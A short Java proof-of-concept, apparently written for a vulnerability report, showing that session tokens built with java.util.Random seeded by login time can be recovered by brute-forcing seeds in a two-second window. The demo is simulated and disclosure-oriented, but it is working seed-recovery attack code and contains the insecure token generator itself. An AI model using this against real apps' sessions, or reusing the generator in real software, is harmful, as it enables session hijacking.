import java.util.Random;

public class SessionTokenPOC {
    private static final String CHARSET = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    private static final int TOKEN_LENGTH = 16;

    // The APK uses the same character-selection loop with java.util.Random().
    // Fixed values make this predictability demo reproducible in the report and README.
    private static final long SIMULATED_LOGIN_SEED = 1735689600123L;
    private static final long WINDOW_MS = 2000L;

    public static void main(String[] args) {
        String observedToken = generateSessionToken(SIMULATED_LOGIN_SEED);
        long windowStart = SIMULATED_LOGIN_SEED - WINDOW_MS;
        long windowEnd = SIMULATED_LOGIN_SEED + WINDOW_MS;
        Long recoveredSeed = recoverSeed(observedToken, windowStart, windowEnd);

        System.out.println("Simulated vulnerable token: " + observedToken);
        System.out.println("Search window: [" + windowStart + ", " + windowEnd + "]");

        if (recoveredSeed == null) {
            System.out.println("Recovered seed: <not found>");
            System.out.println("Predicted token: <none>");
            System.out.println("Attack successful: false");
            return;
        }

        String predictedToken = generateSessionToken(recoveredSeed);
        System.out.println("Recovered seed: " + recoveredSeed);
        System.out.println("Predicted token: " + predictedToken);
        System.out.println("Attack successful: " + observedToken.equals(predictedToken));
    }

    private static Long recoverSeed(String expectedToken, long windowStart, long windowEnd) {
        for (long candidate = windowStart; candidate <= windowEnd; candidate++) {
            if (expectedToken.equals(generateSessionToken(candidate))) {
                return candidate;
            }
        }
        return null;
    }

    private static String generateSessionToken(long seed) {
        Random random = new Random(seed);
        StringBuilder token = new StringBuilder(TOKEN_LENGTH);
        for (int i = 0; i < TOKEN_LENGTH; i++) {
            token.append(CHARSET.charAt(random.nextInt(CHARSET.length())));
        }
        return token.toString();
    }
}
